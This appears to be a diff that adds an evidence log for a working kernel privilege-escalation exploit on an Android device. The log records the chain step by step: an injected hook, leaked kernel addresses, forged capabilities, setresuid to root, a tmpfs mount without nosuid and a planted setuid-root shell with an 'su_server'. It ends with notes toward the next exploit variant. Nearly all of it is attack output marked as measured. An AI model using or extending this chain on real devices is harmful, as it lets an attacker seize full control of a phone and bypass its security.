@@ -1,0 +1,54 @@
+CHANGE 02 evidence — shield-free COMPLETE root (--root2) (MRX-W09, 2026-09-26)
+==============================================================================
+Device: MRX-W09 / 11.0.0.235 / cold boot -> inject_hook(772B,ph=0x300) -> one
+        bugreportz -> perf=-1 -> `ghostlock_e_lr2 --root2` (freeze IN-process +
+        shield-free uid-0 child + mount + 4755 shell).  NO pid-0 shield anywhere.
+
+--- realroot.txt (from the child) ---
+root: child commit ok=1 tries=1 (fsgid kept)          <- setresuid(0,0,1) 1st try
+root: child POST uid=0 euid=0 suid=1 ctx='u:r:shell:s0'
+root: child re-leaked C2=ffffffcbb52f9b40 (final)
+root: OWN CapEff=ffffffcb64fa3d40 prm=ffffffcb64fa3d40 bnd=0000000000000000
+--- root mount phase ---
+root: NS before_self=mnt:[4026533390] init=mnt:[4026533390] open=71 setns_rc=-1 setns_errno=1
+root: mount(tmpfs,'/data/local/tmp/glrt',0,NULL) rc=-1 errno=13
+root: mount(tmpfs,'/mnt',0,NULL) rc=0 errno=0
+root: glsh '/mnt/glsh' ... stat=0 uid=0 gid=2000 mode=104755 size=303720
+root: grandchild exec status=0
+root: ROOT-SHELL OUTPUT: uid=0(root) ... context=u:r:shell:s0
+root: child proof attempted
+root: child entering su_server uid=0
+
+--- the real setuid proof (a uid-2000 process execs the 4755 glsh) ---
+/data/local/tmp/root_mount2.txt:
+  --- uid-2000 exec of 4755 glsh ---
+  uid=0(root) gid=2000(shell) euid=0(root) ... context=u:r:shell:s0
+  -rwsr-xr-x 1 0 2000 303720 /mnt/glsh
+
+--- /proc/mounts: OUR tmpfs has NO nosuid/noexec (the other line is Huawei's /mnt) ---
+tmpfs /mnt tmpfs rw,seclabel,nosuid,nodev,noexec,...,mode=755,gid=1000 0 0   <- pre-existing
+tmpfs /mnt tmpfs rw,seclabel,relatime,gid=2000 0 0                          <- OURS
+
+--- no pid-0 task ---
+ps -A -o PID,UID,NAME | grep ghostlock:
+  6230 2000 ghostlock_e_lr2      (MAIN, parks)
+  7362    0 ghostlock_e_lr2      (uid-0 child / su_server, REAL pid)
+  (no bracketed [ghostlock...] pid-0 idle-looking task)
+device: uptime continued; no reboot, no panic.
+
+--- conclusions ---
+[B1] `--root2` = freeze + cap_effective(CAP_SETUID) -> setresuid(0,0,1) -> uid 0
+     + post-commit cap_effective(CAP_SYS_ADMIN) -> mount(2) rc=0 + 4755 shell,
+     with NO pid-0 shield.                                          [MEASURED]
+[B2] A uid-2000 exec of the 4755 /mnt/glsh yields euid=0 -> the tmpfs is NOT
+     nosuid.                                                        [MEASURED]
+[B3] The only uid-0 process is the child with a REAL pid (7362) -> it can exit
+     cleanly; the panic landmine is gone.                           [MEASURED]
+
+--- open items ---
+- mount base is non-deterministic: /data/local/tmp/glrt failed (EACCES) and /mnt
+  won, because cap_effective lacked CAP_DAC_OVERRIDE (bit1) this run (the cap bits
+  come from the chosen node address' low32). The `--root-gms` block hardcodes
+  B=/data/local/tmp/glrt/gms, so GMS needs a cap value that also carries
+  CAP_DAC_OVERRIDE -- or a base-independent staging path.  To be addressed for
+  --root-gms2.
